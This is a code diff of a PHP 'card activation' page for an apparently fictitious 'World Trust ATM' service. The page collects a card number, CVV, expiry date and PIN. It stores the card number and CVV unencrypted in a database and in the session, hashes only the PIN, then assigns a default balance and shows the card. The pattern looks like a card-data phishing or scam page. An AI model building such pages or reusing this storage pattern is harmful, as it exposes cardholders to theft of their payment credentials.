@@ -1,20 +1,18 @@
 <?php
 /**
  * World Trust ATM - Card Activation
- * Page 3: PIN Setup & Card Details
+ * Page 2: Card Details & PIN Setup
  */
 
 require_once 'includes/config.php';
 require_once 'includes/functions.php';
 require_once 'includes/database.php';
 
-// Check session
+// Check session - user must have completed step 1
 check_user_session();
-check_card_session();
 check_session_timeout();
 
 $errors = [];
-$success = false;
 
 // Handle form submission
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
@@ -23,6 +21,9 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     $expiry = sanitize_input($_POST['expiry'] ?? '');
     $pin = sanitize_input($_POST['pin'] ?? '');
     $confirm_pin = sanitize_input($_POST['confirm_pin'] ?? '');
+    
+    // Remove spaces from card number
+    $card_number = preg_replace('/\s+/', '', $card_number);
     
     // Validate card number
     if (empty($card_number)) {
@@ -41,6 +42,8 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     // Validate expiry
     if (empty($expiry)) {
         $errors['expiry'] = 'Expiration date is required';
+    } elseif (!preg_match('/^\d{2}\/\d{2}$/', $expiry)) {
+        $errors['expiry'] = 'Expiration date must be in MM/YY format';
     }
     
     // Validate PIN
@@ -57,38 +60,51 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         $errors['confirm_pin'] = 'PINs do not match';
     }
     
-    // If no errors, save to database and show loading animation
+    // If no errors, save to database and redirect
     if (empty($errors)) {
         $pin_hash = password_hash($pin, PASSWORD_DEFAULT);
+        $request_id = $_SESSION['request_id'] ?? null;
         
-        // Save to database
-        $request_id = save_activation_request(
-            $_SESSION['user_data'],
-            $_SESSION['card_data'],
-            $pin_hash
-        );
-        
+        // Update the activation request with card details and PIN
         if ($request_id) {
-            // Store request ID in session
-            $_SESSION['request_id'] = $request_id;
-            
-            // Set success flag to trigger loading animation
-            $success = true;
+            $db = get_db_connection();
+            if ($db) {
+                try {
+                    $stmt = $db->prepare('UPDATE activation_requests 
+                                          SET card_number = ?, cvv = ?, expiry_date = ?, pin_hash = ?
+                                          WHERE id = ?');
+                    $stmt->execute([$card_number, $cvv, $expiry, $pin_hash, $request_id]);
+                    
+                    // Store card details in session for card-display.php
+                    $_SESSION['card_number'] = $card_number;
+                    $_SESSION['cvv'] = $cvv;
+                    $_SESSION['expiry'] = $expiry;
+                    $_SESSION['balance'] = DEFAULT_BALANCE;
+                    
+                    // Redirect to card display
+                    header('Location: card-display.php');
+                    exit();
+                } catch (PDOException $e) {
+                    error_log('Failed to update card details: ' . $e->getMessage());
+                    $errors['general'] = 'Failed to save card details. Please try again.';
+                }
+            } else {
+                $errors['general'] = 'Database connection failed. Please try again.';
+            }
         } else {
-            $errors['general'] = 'Failed to submit activation request. Please try again.';
+            $errors['general'] = 'Session expired. Please start over.';
         }
     }
 }
 
 $user_name = get_full_name();
-$card_data = $_SESSION['card_data'];
 ?>
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title><?php echo APP_NAME; ?> - PIN Setup</title>
+    <title><?php echo APP_NAME; ?> - Card Information & PIN Setup</title>
     <link rel="stylesheet" href="css/styles.css">
 </head>
 <body>
@@ -99,19 +115,9 @@ $card_data = $_SESSION['card_data'];
             <p class="tagline"><?php echo APP_TAGLINE; ?></p>
         </header>
 
-        <!-- Loading Container (hidden by default, shown after successful submission) -->
-        <div class="loading-container" id="processingContainer" style="display: none;">
-            <div class="loading-spinner"></div>
-            <p class="loading-text" id="loadingText">Processing your activation...</p>
-            <div class="progress-bar-container">
-                <div class="progress-bar" id="progressBar"></div>
-            </div>
-            <p class="progress-text"><span id="progressPercent">0</span>% Complete</p>
-        </div>
-
         <!-- PIN Setup Container -->
         <div class="pin-setup-container" id="pinSetupContainer">
-            <h2 class="form-title">Complete Card Activation</h2>
+            <h2 class="form-title">Card Information & PIN Setup</h2>
             <p class="form-subtitle">Enter your card details and set up your secure PIN</p>
             
             <span class="security-badge">Secure Form</span>
@@ -128,10 +134,11 @@ $card_data = $_SESSION['card_data'];
                     <h3 class="section-title">Card Information</h3>
                     
                     <div class="form-group">
-                        <label for="details">Card Details <span class="required">*</span></label>
+                        <label for="details">Card Number <span class="required">*</span></label>
                         <input type="text" id="details" name="details" 
                                placeholder="1234 5678 9012 3456" 
                                maxlength="19"
+                               value="<?php echo htmlspecialchars($_POST['details'] ?? ''); ?>"
                                required aria-required="true">
                         <?php if (isset($errors['details'])): ?>
                             <span class="error-message show"><?php echo $errors['details']; ?></span>
@@ -144,6 +151,7 @@ $card_data = $_SESSION['card_data'];
                             <input type="text" id="expiry" name="expiry" 
                                    placeholder="MM/YY" 
                                    maxlength="5"
+                                   value="<?php echo htmlspecialchars($_POST['expiry'] ?? ''); ?>"
                                    required aria-required="true">
                             <?php if (isset($errors['expiry'])): ?>
                                 <span class="error-message show"><?php echo $errors['expiry']; ?></span>
@@ -206,7 +214,7 @@ $card_data = $_SESSION['card_data'];
                     </div>
                 </div>
                 
-                <button type="submit" class="btn btn-primary">Complete Activation</button>
+                <button type="submit" class="btn btn-primary">Continue to Card Display</button>
             </form>
         </div>
         
@@ -217,10 +225,6 @@ $card_data = $_SESSION['card_data'];
         </div>
     </div>
     
-    <script>
-        // Pass success flag from PHP to JavaScript
-        const activationSuccess = <?php echo $success ? 'true' : 'false'; ?>;
-    </script>
     <script src="js/pin-setup.js"></script>
 </body>
 </html>
